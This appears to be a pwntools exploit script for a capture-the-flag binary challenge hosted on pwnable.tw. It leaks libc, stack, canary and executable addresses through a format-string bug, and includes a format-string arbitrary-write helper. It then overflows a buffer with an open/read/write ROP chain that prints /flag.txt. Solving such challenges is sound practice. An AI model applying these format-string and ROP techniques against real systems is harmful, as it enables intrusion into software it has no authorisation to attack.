#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("task_patched")
libc = ELF("./libc-2.27.so")
rop = ROP(libc)
ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./task_patched")
    gdb.attach(p,'''b*echo+189\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./task_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def fmt(data):
    sla('message:', data)

def write_to(data, addr):
    first_2 = data & 0xffff
    second_2 = (data & 0xffff0000) >> 8*2
    third_2 = (data & 0xffff00000000) >> 8*4

    
    if data > 0xffff:
        payload = b'%' + str(first_2).encode() + b'c%9$hn' + b' '*(0x18-7-len(str(first_2).encode())) + p64(addr)
        fmt(payload)
        payload = b'%' + str(second_2).encode() + b'c%9$hn' + b' '*(0x18-7-len(str(second_2).encode())) + p64(addr+2)
        fmt(payload)
        payload = b'%' + str(third_2).encode() + b'c%9$n' + b' '*(0x18-6-len(str(third_2).encode())) + p64(addr+4)
        fmt(payload)
    else:
        payload = b'%' + str(first_2).encode() + b'c%9$ln' + b' '*(0x18-7-len(str(first_2).encode())) + p64(addr)
        fmt(payload)


#############
# Leak_addr #
#############
fmt(b'%p%21$p%15$p%18$p')
p.recvuntil(b'0x')
libc.address = int(p.recv(12), 16) - 0x3eba83
log.info('Libc_base:    '+ hex(libc.address))
p.recvuntil(b'0x')
stack_addr =  int(p.recv(12), 16)
log.info('Stack_leak:   '+ hex(stack_addr))
p.recvuntil(b'0x')
canary =  int(p.recv(16), 16)
log.info('Canary:       '+ hex(canary))
ret_addr = stack_addr - 224
log.info('Ret_addr:     '+ hex(ret_addr))
p.recvuntil(b'0x')
exe_addr =  int(p.recv(12), 16) - 0x340
log.info('Exe_leak:     '+ hex(exe_addr))
############## gadgets ##############
flag_string = ret_addr - 103
flag_addr = ret_addr + 0x400
rdi_ret = libc.address + 0x2164f
rsi_ret = libc.address + 0x23a6a

rax_ret = libc.address + 0x1b500
rbx_ret = libc.address + 0x2c729
rcx_ret = libc.address + 0x00000000000e433e
rdx_ret = libc.address + 0x1b96

syscall = libc.address + 0xd2625  # syscall; ret;

xor_rax = libc.address + 0xb1485
ret     = libc.address + 0x8aa
binsh   = libc.address + 0x1b3d88
system  = libc.address + 0x4f420
int_80 = libc.address +  0x2cef

r14_ret = libc.address + 0x0000000000023a69
call_r14 = libc.address + 0x0000000000022a80
open   = libc.address + 0x10fbf0
fgets   = libc.address + 0x7ead0
#####################################

file_name = b'/flag.txt\0'
rop = ROP(libc)
rop(rax=0x2, rdi=flag_string, rsi=0, rdx=0)
rop.raw(syscall)

rop(rax=0, rdi=3, rsi=flag_string, rdx=0x50)
rop.raw(syscall)

rop(rax=1, rdi=1, rsi=flag_string, rdx=0x50)
rop.raw(syscall)

rop.raw(ret)
rop.raw(elf.sym.main)

p.sendlineafter(b':', b"A"*0x48 + pack(canary) + b"C"*8 + rop.chain())
p.sendlineafter(b':', b'x'+ file_name)

p.interactive()